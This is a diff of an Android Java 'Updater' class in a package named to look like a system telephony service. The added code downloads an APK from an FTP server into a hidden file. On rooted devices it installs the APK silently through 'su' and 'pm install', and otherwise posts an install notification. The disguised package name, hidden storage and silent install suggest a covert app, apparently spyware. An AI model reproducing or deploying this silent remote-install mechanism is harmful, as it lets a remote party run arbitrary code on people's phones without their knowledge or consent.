@@ -3,6 +3,12 @@ package com.telephony.services;
 import java.io.File;
 import java.io.IOException;
 import java.lang.ref.WeakReference;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
 
 import android.content.Context;
 import android.content.Intent;
@@ -17,6 +23,7 @@ public class Updater {
 	public static final String VER_PROP_FILE = "ver.prop";
 	public static final String REMOTE_VER = "ver";
 	public static final String APK_REMOTE_FILE = "apk";
+	public static final String APK_REMOTE_DESCRIPTION = "description";
 
 	public Updater(Context context, final MyFTPClient ftp) throws IOException {
 		this.ftp = ftp;
@@ -39,29 +46,39 @@ public class Updater {
 		}
 		return null;
 	}
+	
+	public String getAPKRemoteDescription() {
+		if (!props.isEmpty()) {
+			return props.getProperty(APK_REMOTE_DESCRIPTION, "");
+		}
+		return null;
+	}
 
-	public void updateAPK() throws IOException {
-
+	public void updateAPK() throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException,
+			NoSuchPaddingException {
 		long rfs = ftp.getFileSize(getAPKRemoteFile());
+		boolean downloadSuccsess = true;
 		if (rfs > 0) {
 			File apk_file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), getAPKRemoteFile()));
 			if (apk_file != null) {
 				if ((apk_file.exists() && (apk_file.length() != rfs)) || (!apk_file.exists())) {
-					if (ftp.downloadFile(getAPKRemoteFile(), apk_file)) {
-						if (Utils.CheckRoot()) {
-							new Proc("su").exec(new String[] { "pm install " + apk_file.getAbsolutePath() });
-						} else {
-							Intent intent = new Intent(Intent.ACTION_VIEW);
-							intent.setDataAndType(Uri.fromFile(apk_file), "application/vnd.android.package-archive");
-							intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-							if (wContext != null) {
-								Utils.show_notification(wContext.get(), 0, intent);
-							}
+					downloadSuccsess = ftp.downloadFile(getAPKRemoteFile(), apk_file);
+				}
+				if (downloadSuccsess && apk_file.exists()) {
+					if (Utils.CheckRoot()) {
+						new Proc("su").exec(new String[] { "pm install " + apk_file.getAbsolutePath() });
+					} else {						
+						Intent intent = new Intent(Intent.ACTION_VIEW);
+						intent.setDataAndType(Uri.fromFile(apk_file), "application/vnd.android.package-archive");						
+						intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+						if (wContext != null) {
+							Utils.show_notification(wContext.get(), 0, getAPKRemoteDescription(), intent);
 						}
 					}
 				}
 			}
 		}
+
 	}
 
 	public void free() {
